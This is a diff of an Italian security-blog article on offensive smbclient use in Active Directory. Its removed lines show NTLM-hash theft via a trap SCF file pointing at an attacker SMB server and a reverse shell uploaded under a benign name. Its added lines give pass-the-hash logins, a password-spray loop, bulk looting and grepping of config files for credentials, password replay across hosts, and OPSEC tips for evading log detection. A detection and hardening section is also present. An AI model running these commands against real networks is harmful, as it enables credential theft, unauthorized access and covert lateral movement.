@@ -1,5 +1,6 @@
 ---
-title: 'Smbclient: accesso e attacco alle condivisioni Windows'
+title: 'Smbclient: Accesso e Attacco Alle Condivisioni Windows'
+slug: smbclient
 description: >-
   Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB.
   Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.
@@ -13,166 +14,229 @@ subcategories:
 tags:
   - smbclient
   - smb
-slug: "smbclient"
 ---
 
-# SMBclient: dall’accesso alla share al dominio
+# Smbclient: Accesso e Attacco Alle Condivisioni Windows
 
-Report Red Team | Ambiente controllato autorizzato
+**Durante un internal assessment, la command-line enumeration con smbclient (client SMB da riga di comando) rivela una share `\\FILESRV01\Deploy$` accessibile con un service account compromesso. L'exploitation tramite smbclient porta alla scoperta di password hardcoded in script di configurazione, abilitando privilege escalation e movimento laterale tramite riutilizzo credenziali.**
 
-Questa guida approfondisce l’uso offensivo di smbclient andando oltre la semplice enumerazione di file. L’obiettivo è mostrare come trasformare un accesso base a una share SMB in un vettore per il movimento laterale, il furto di credenziali tramite hash NTLM e la preparazione di attacchi Pass-the-Hash e NTLM relay. Nel flusso operativo vengono integrati ntlm\_theft e la suite Impacket.
+## TL;DR Operativo (Flusso a Step)
 
-## Introduzione: SMB come vettore strategico
+1. Enumerazione: Usa `smbclient -L` con opzioni avanzate (`-m SMB3`, `-N`) per identificare share esposte.
+2. Autenticazione: Connettiti alle share con credenziali (`-U 'DOMAIN\user'`), hash NTLM (`--pw-nt-hash`) o ticket Kerberos (`-k`).
+3. Ricognizione Mirata: Nella shell interattiva `smb:\>` esegui `ls`, `cd`; per enumerazione profonda usa `recurse ON`.
+4. Loot Mirato: Scarica file critici con `mget *.config *.xml *.ps1` in modalità non-interattiva (`-c 'prompt OFF'`).
+5. Analisi e Riutilizzo: Estrai credenziali dai file e testane il riutilizzo su altre share con `smbclient -L //nuovo_target`.
+6. Movimento Laterale: Riutilizza credenziali valide con `smbclient -L //target` per enumerare nuove share e accedere a sistemi aggiuntivi.
+7. Post-Compromise: Sfrutta accesso a share amministrative per raccolta di file sensibili e persistenza.
 
-SMB non è solo un protocollo di condivisione file. In ambienti Windows e Active Directory rappresenta un canale centrale per l’autenticazione e un punto critico di raccolta di informazioni sensibili.
+## SMBCLIENT Advanced Usage in Red Team Context
 
-L’accesso anonimo o guest può talvolta fornire un foothold iniziale, ma è con credenziali valide, anche a basso privilegio, che smbclient esprime il suo reale valore offensivo.
+**Comandi avanzati, gestione protocolli, autenticazione alternativa e tecniche di automazione.**
 
-SMB consente di:
+**Forzatura Protocollo SMB2/3 e Negoziazione NTLMv2:**
 
-* muoversi lateralmente tra sistemi
-* individuare file di configurazione, script e backup
-* innescare il furto di hash NTLM
-* preparare fasi successive di post-exploitation
-
-L’approccio corretto è progressivo: da una share accessibile si estraggono dati, si espande l’accesso e si punta a credenziali sempre più privilegiate fino al dominio.
-
-## Setup dell’ambiente offensivo
-
-Oltre a smbclient sono necessari strumenti di supporto come Impacket e ntlm\_theft.
-
-```
-sudo apt update
-sudo apt install impacket-scripts python3-impacket seclists -y
+```bash
+smbclient -L //10.10.10.10 -U 'CORP\svc_backup' --option='client min protocol=SMB2'
 ```
 
-Clonazione di ntlm\_theft:
+In ambienti enterprise hardened, SMB1 e NTLMv1 sono spesso disabilitati. Forzare il protocollo minimo a SMB2 garantisce una negoziazione corretta con NTLMv2.
 
-```
-git clone https://github.com/Greenwolf/ntlm_theft
-cd ntlm_theft
-pip3 install -r requirements.txt
-```
+**Autenticazione con Hash NTLM (Pass-the-Hash):**
 
-Per le tecniche di NTLM theft è necessario un server SMB controllato dall’attaccante, ad esempio smbserver.py di Impacket o Responder.
-
-## Tecniche offensive avanzate
-
-## Tecnica 1: movimento laterale con credenziali rubate
-
-Situazione: su WS01 vengono trovate credenziali di dominio LAB\svc\_deploy all’interno di unattend.xml. L’obiettivo è verificare l’accesso alle share di SRV01.
-
-```
-smbclient -L //SRV01 -U 'LAB\svc_deploy' -W LAB
+```bash
+smbclient //10.10.10.10/Share -U 'CORP\Administrator' --pw-nt-hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
-Connessione alla share individuata:
+In scenari di post-compromise, quando si possiede l'hash NTLM, è possibile autenticarsi senza password in chiaro, abilitando scenari di pass-the-hash.
 
-```
-smbclient //SRV01/Deploy_scripts -U 'LAB\svc_deploy' -W LAB -c 'ls'
-```
+**Autenticazione Kerberos (Post-Compromise AD):**
 
-Download di uno script di provisioning:
-
-```
-smbclient //SRV01/Deploy_scripts -U 'LAB\svc_deploy' -W LAB -c 'get join_domain.ps1'
+```bash
+kinit svc_backup@CORP.LOCAL
+smbclient -L //filesrv01.corp.local -k
 ```
 
-Questa è la forma classica di movimento laterale. Credenziali recuperate in un contesto permettono l’accesso a risorse in un altro. Script di provisioning e automazione di dominio spesso contengono password hardcoded o token privilegiati.
+Con un ticket TGT già ottenuto (es. tramite credential dumping), `-k` usa Kerberos per l'autenticazione. Riduce l'esposizione di password in rete ed è meno sospetto in ambienti AD monitorati.
 
-## Tecnica 2: ricerca aggressiva di credenziali nei file
+**Null Session per Enumerazione Iniziale:**
 
-Situazione: accesso in scrittura alla share Data su SRV01.
-
-```
-smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'prompt OFF; recurse ON; mget *.txt *.ini *.config *.xml *.bak *.vbs *.ps1 *.bat *.kdbx *.env'
+```bash
+smbclient -L //10.10.10.10 -N
 ```
 
-Questa tecnica consente di scaricare ricorsivamente file potenzialmente sensibili. Il loot va analizzato localmente con grep, strings o strumenti simili per individuare password, chiavi o token.
+Tenta una connessione senza credenziali. Se restituisce share, indica una grave misconfigurazione.
 
-## Tecnica 3: deposito di payload su share scrivibili
+## Fase 1 – Ricognizione & Enumeration
 
-Situazione: la share Data è accessibile a più utenti e account di servizio.
+**Enumerazione mirata delle share SMB utilizzando esclusivamente smbclient.**
 
-```
-smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'put reverse_shell.exe log_viewer.exe'
-```
+**Enumerazione Base delle Share:**
 
-Inserimento di un file di istruzioni per favorire l’esecuzione:
-
-```
-smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'put instructions.txt README_logs.txt'
+```bash
+smbclient -L //10.10.10.10 -U 'CORP\svc_backup' -m SMB3
 ```
 
-Le share scrivibili sono punti ideali per la distribuzione di payload o trappole. Account di servizio e job automatici aumentano la probabilità di esecuzione del file malevolo.
+Identifica tutte le share (`Disk`) disponibili per l'utente autenticato.
 
-## Tecnica 4: furto di hash NTLM con file trappola
+**Enumerazione Profonda: `ls` vs `recurse ON; ls`:**
 
-Situazione: accesso in scrittura a \SRV01\Public con l’obiettivo di rubare hash NTLM.
-
-Concetto: Windows tenta automaticamente l’autenticazione SMB quando apre file che contengono riferimenti a percorsi remoti, inviando l’hash NTLMv2 dell’utente loggato.
-
-Generazione del file trappola:
-
-```
-python3 ntlm_theft.py --generate scf --server 192.168.1.50 --filename Vacation_Photos
+```bash
+# Enumerazione superficiale (singola directory)
+smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'ls'
 ```
 
-Upload nella share:
-
-```
-smbclient //SRV01/Public -U 'LAB\svc_deploy' -W LAB -c 'put Vacation_Photos.scf'
-```
-
-Avvio del server SMB in ascolto:
-
-```
-impacket-smbserver SHARE ./loot -smb2support
+```bash
+# Enumerazione ricorsiva (tutte le sottodirectory)
+smbclient //10.10.10.10/Data -U 'CORP\svc_backup' -c 'recurse ON; ls'
 ```
 
-Quando un utente esplora la share, il suo hash NTLMv2 viene inviato automaticamente al server dell’attaccante.
+* **Differenza Operativa:** Il primo comando genera un singolo Event ID 5145 per la directory root. Il secondo genera un evento 5145 per *ogni* directory e file enumerato, aumentando drasticamente il rumore nei log e il rischio di detection.
 
-Questa tecnica consente cracking offline o utilizzo diretto in Pass-the-Hash o NTLM relay.
+**Enumerazione con Credenziali Multiple (One-Liner):**
 
-## Scenario di attacco completo
-
-Contesto: utente LAB\user1 con accesso a Department\_Share su FILESRV01.
-
-Ricognizione iniziale:
-
-```
-smbclient //FILESRV01/Department_Share -U 'LAB\user1' -W LAB -c 'ls; recurse ON; mget *.txt *.xlsx'
+```bash
+for user in $(cat users.txt); do smbclient -L //10.10.10.10 -U "CORP\\$user%Welcome123" -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] $user has access"; done
 ```
 
-Vengono trovate credenziali svc\_mssql in un file Excel.
+Testa rapidamente una lista di utenti con una password comune per identificare accessi validi.
 
-Verifica accesso su DBSRV01:
+## Fase 2 – Initial Exploitation
+
+**Accesso alle share e valutazione dei permessi di lettura/scrittura tramite comandi interattivi di smbclient.**
+
+**Accesso Interattivo e Comandi Base:**
+
+```bash
+smbclient //10.10.10.10/Data -U 'CORP\svc_backup'
+```
+
+Nella shell `smb:\>` usa:
 
 ```
-smbclient -L //DBSRV01 -U 'LAB\svc_mssql' -W LAB
+smb: \> ls
+smb: \> cd Finance
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> get report.pdf
+smb: \> put canary.txt
 ```
 
-Upload file trappola e cattura hash tramite Responder.
+**Test Permessi Scrittura in Modalità One-Liner:**
 
-Cracking dell’hash e verifica privilegi, seguiti da dump delle credenziali tramite Impacket fino al controllo del dominio.
+```bash
+echo "PENTEST_CANARY" > test.txt && smbclient //10.10.10.10/Public -U 'CORP\svc_backup' -c 'put test.txt; del test.txt' 2>&1 | grep -v "failed"
+```
 
-Risultato finale: da una semplice share SMB si arriva alla compromissione di account privilegiati e del dominio Active Directory.
+Verifica rapidamente i permessi di scrittura e pulisci le tracce.
 
-## Considerazioni finali
+## Fase 3 – Post-Compromise & Privilege Escalation
 
-SMB deve essere considerato un protocollo di autenticazione, non solo di file sharing.
-smbclient è lo strumento operativo.
-ntlm\_theft costruisce le trappole.
-Impacket riceve ed estrae valore.
+**Analisi dei file estratti e ricerca di credenziali riutilizzabili per l'escalation.**
 
-Usati in catena permettono escalation complete in ambienti mal configurati.
+**Loot Mirato di File di Configurazione:**
 
-## HackITA
+```bash
+smbclient //10.10.10.10/Deploy$ -U 'CORP\svc_backup' -c 'recurse ON; prompt OFF; mget *.config *.ini *.xml *.env 2>/dev/null'
+```
 
-[Supporta](https://hackita.it/supporto/) HackITA per mantenere contenuti tecnici indipendenti.
-[Formazione](https://hackita.it/servizi/) 1:1 su Active Directory e Red Teaming.
-Servizi di sicurezza per aziende in ambienti autorizzati.
+**Estrazione di Credenziali dai File:**
 
-Non limitarti ad accedere a una share.
-Usala come vettore.
-Chiudi la catena.
+```bash
+grep -r -i -E "password|pwd=|connectionString|token=|key=" ./loot/ --include="*.{config,xml,ini}" 2>/dev/null
+```
+
+**Ricerca di Chiavi SSH e Certificati:**
+
+```bash
+find ./loot/ -type f \( -name "id_rsa" -o -name "*.pem" -o -name "*.pfx" \) 2>/dev/null
+```
+
+## Fase 4 – Lateral Movement & Pivoting
+
+**Riutilizzo delle credenziali compromesse per accedere a nuove share e sistemi tramite smbclient.**
+
+**Password Replay con Smbclient:**
+
+```bash
+for ip in $(cat targets.txt); do smbclient -L //$ip -U 'CORP\svc_backup%Password123!' -m SMB3 2>/dev/null | grep -q "Disk" && echo "[+] Share found on $ip"; done
+```
+
+**Accesso a Share Amministrative con Hash NTLM:**
+
+```bash
+smbclient //10.10.10.20/C$ -U 'CORP\Administrator' --pw-nt-hash <NTLM_HASH> -c 'ls'
+```
+
+Utilizza l'hash NTLM ottenuto in fase di post-compromise per tentare l'accesso a share privilegiate.
+
+## Fase 5 – Detection & Hardening
+
+**Indicatori di Compromissione specifici per l'uso di smbclient e mitigazioni.**
+
+**Detection Specifica:**
+
+* **Event ID 5145 (Detailed File Share)**: Picchi di operazioni `Read` su file `.config`, `.xml`, `.ps1` dallo stesso utente in \<60 secondi.
+* **Event ID 4663 (Object Access)**: Pattern anomali di `SMB2 CREATE` seguito immediatamente da `SMB2 WRITE` (upload file sospetti).
+* **Event ID 4624 (Logon Type 3)**: Logon di rete da source IP insoliti correlati ad accessi a share.
+* **SMB2 WRITE Pattern**: Elevato numero di operazioni di open/write/close in breve tempo su share non destinate al file sharing utente.
+
+**OPSEC per SMBCLIENT:**
+
+* **Autenticazione**: Preferire l'input interattivo della password o l'uso di ticket Kerberos (`-k`) all'inline `%password`.
+* **Enumerazione Profonda**: Usare `recurse ON` solo quando necessario, poiché genera un volume di log elevato.
+* **Timing**: Dilazionare le operazioni di loot per evitare spike di eventi 5145/4663.
+* **Loot Mirato**: Preferire `mget *.ext` a `mget *` per ridurre il numero di file trasferiti e gli eventi generati.
+
+**Hardening Concreto:**
+
+* **Principio del Privilegio Minimo**: Gli account di servizio devono avere accesso solo alle share necessarie, con permessi di sola lettura.
+* **Abilitare e Forzare SMB Signing**: Previene attacchi di relay.
+* **Auditing Avanzato**: Abilitare auditing dettagliato (Success/Failure) sulle share critiche. Monitorare le soglie per operazioni `Read/Write` anomale.
+* **Disabilitare SMBv1 e NTLMv1**: Forzare l'uso di SMB2/3 e NTLMv2.
+* **Segmentazione di Rete**: Isolare i file server e limitare le connessioni SMB (445/tcp) tramite firewall interno.
+
+## Errori Comuni Che Vedo Negli Assessment Reali
+
+* **Non forzare SMB2/3**: Causa errori di negoziazione in ambienti dove SMB1 è disabilitato.
+* **Ignorare l'autenticazione Kerberos (`-k`)**: Non sfruttare ticket TGT disponibili, perdendo un'opzione più stealth.
+* **Uso indiscriminato di `recurse ON`**: Genera un volume esplosivo di log 5145, aumentando esponenzialmente il rischio di detection.
+* **Errata interpretazione errori**: Confondere `NT_STATUS_ACCESS_DENIED` (permessi) con `NT_STATUS_BAD_NETWORK_NAME` (share inesistente).
+* **OPSEC povero**: Lasciare password in chiaro nella history dei comandi o eseguire operazioni massive in orari lavorativi.
+
+## Mini Tabella 80/20 Finale
+
+| Obiettivo                   | Azione                           | Comando SMBCLIENT                                                                     |
+| :-------------------------- | :------------------------------- | :------------------------------------------------------------------------------------ |
+| **Enumerare Share**         | Listare share disponibili        | `smbclient -L //TARGET -U 'DOMAIN\user' -m SMB3`                                      |
+| **Autenticazione Hash**     | Uso NTLM hash per autenticazione | `smbclient //TARGET/Share -U user --pw-nt-hash <HASH>`                                |
+| **Autenticazione Kerberos** | Usare ticket TGT                 | `kinit user; smbclient -L //target -k`                                                |
+| **Loot Automatico**         | Scaricare file di configurazione | `smbclient //TARGET/Share -U 'user' -c 'recurse ON; prompt OFF; mget *.config *.xml'` |
+| **Test Scrittura**          | Verificare permessi di upload    | `smbclient //TARGET/Share -U 'user' -c 'put test.txt'`                                |
+
+**Perfeziona l'uso avanzato di smbclient, inclusa l'autenticazione via hash NTLM e Kerberos, in uno scenario di lab realistico multi-step che replica un ambiente enterprise con auditing avanzato e SMB signing abilitato.**
+
+## 🔗 Link Interni HackITA
+
+Approfondisci le tecniche correlate:
+
+* [https://hackita.it/articoli/smb](https://hackita.it/articoli/smb)
+* [https://hackita.it/articoli/kerberos](https://hackita.it/articoli/kerberos)
+* [https://hackita.it/articoli/pass-the-hash](https://hackita.it/articoli/pass-the-hash)
+* [https://hackita.it/articoli/pivoting](https://hackita.it/articoli/pivoting)
+
+Per servizi Red Team e simulazioni realistiche in ambienti enterprise:
+
+* [https://hackita.it/servizi](https://hackita.it/servizi)
+
+Per supportare il progetto:
+
+* [https://hackita.it/supporta](https://hackita.it/supporta)
+
+***
+
+## 🌍 Riferimenti Tecnici Ufficiali (max 3)
+
+* [https://www.samba.org/samba/docs/current/man-html/smbclient.1.html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+* [https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145)
+* [https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always)
